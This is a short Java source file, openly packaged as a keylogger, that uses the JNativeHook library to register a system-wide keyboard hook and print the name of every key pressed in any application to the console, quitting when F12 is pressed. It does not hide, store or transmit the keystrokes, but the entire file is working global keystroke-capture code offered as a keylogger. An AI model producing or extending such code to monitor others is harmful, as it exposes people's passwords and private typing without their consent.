/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package keylogger;

import org.jnativehook.GlobalScreen;
import org.jnativehook.keyboard.NativeKeyListener;
import org.jnativehook.keyboard.NativeKeyEvent;


/**
 *
 * @author GoD
 */
public class KeyLog implements NativeKeyListener {
    /**
     * @param args the command line arguments
     */
    public static void main(String[] args) {
        
        try{
            GlobalScreen.registerNativeHook();
        }
        catch(Exception e){
            e.printStackTrace();
        }
        GlobalScreen.getInstance().addNativeKeyListener(new KeyLog());
    }

    @Override
    public void nativeKeyPressed(NativeKeyEvent e) {
        if(e.getKeyCode()==NativeKeyEvent.VK_F12){
            System.exit(0);
        }
        else{
        System.out.print(" "+NativeKeyEvent.getKeyText(e.getKeyCode()));
        }
    }
    
    @Override
    public void nativeKeyReleased(NativeKeyEvent e) {
        
    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent e) {
        
    }
}